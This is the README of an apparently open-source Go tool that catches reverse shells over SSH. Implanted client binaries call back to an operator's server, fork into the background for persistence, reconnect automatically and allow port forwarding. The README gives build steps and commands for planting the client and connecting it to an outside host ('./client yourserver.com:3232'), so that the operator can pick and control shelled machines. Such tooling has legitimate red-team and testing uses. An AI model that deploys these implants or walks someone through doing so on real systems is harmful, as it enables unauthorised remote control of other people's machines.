# Reverse SSH
By far one of the stupidest things I've been thinking of for a while. Have an ssh client connect to a server, and then provide the server the ability to control the client


Essentially works like any reverse shell muliplexer thing. Only fun thing here is that everything uses SSH.   

You, the human client connect to the reverse shell catcher with ssh, and then select which remote host you want to connect to. 

```
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+ Shelled |
                    |    Reverse     |       |         |  Client |
                    |  Connection    |       |         |         |
                    |    Catcher     |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |         |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         | Shelled |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         | Shelled |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```
## How to use

Depending on the platform, you're building the server and client for. You may need to change the GOOS and GOARCH enviroment variables. E.g building for linux:
```
GOOS=linux GOARCH=amd64 make
```

The server will automatically generate a private key on first use. Or you can specify one with `--key`. And you will need to create an `authorized_keys` file, containing *Your* public key. 
This will allow the server to authenticate you, to allow you to control whatever reverse shell connections it catches. 
```
cp ~/.ssh/id_ed25519.pub authorized_keys
./server 0.0.0.0:3232 #Set the server to listen on port 3232
```

Put the client binary on whatever you want to control. 
```
./client yourserver.com:3232
```

This will cause the client to fork into the background. If you want to montior the output for debugging purposes specify `--foreground`.  
The client will attempt to detect shells such as bash, ash, sh and execute one of those if possible. If it cant find one. Then you will be asked to enter in a path.

Then connect to your server:

```
ssh yourserver.com:3232
```

You will be presented by a list of controllable clients, e.g:
```
Connected controllable clients:                                                                                            e43bdff83d71a8a70e2c89fc27334e18722acaa1b600feb01c836351967bc258@127.0.0.1:55526, client version: SSH-2.0-Go
>
```

Use `help` or press `tab` to view commands.  
Tab will auto complete entries. 
So you you wanted to connect to the client given in the example: 
```
> connect 4<TAB>
```
Will auto complete the entry for you and on enter will connect you to your reverse shell. 


## Limitations

This doesnt work entirely correctly for windows programs, due to limitations of the windows platform. But you can still run commands. 
ALthough they might not end properly, or be ctrl+c-able

## Todo

- ~~Make the selection UI a bit better~~
- ~~Handle IO errors better in all parties~~
- ~~Remove remote connection host from list when a disconnection is registered~~
- ~~Make the client cleanly fork itself from whatever parent it started from, giving it persistence (might be hard in go)~~
- ~~direct-tcp port forwarding to select hosts~~
- ~~Client reconnect on loss of connection~~
- ~~Add authentication bits and bobs~~
- Ensure threadsafety of key structures
- ~~Fix the passing of enviroment variables such as TERM~~
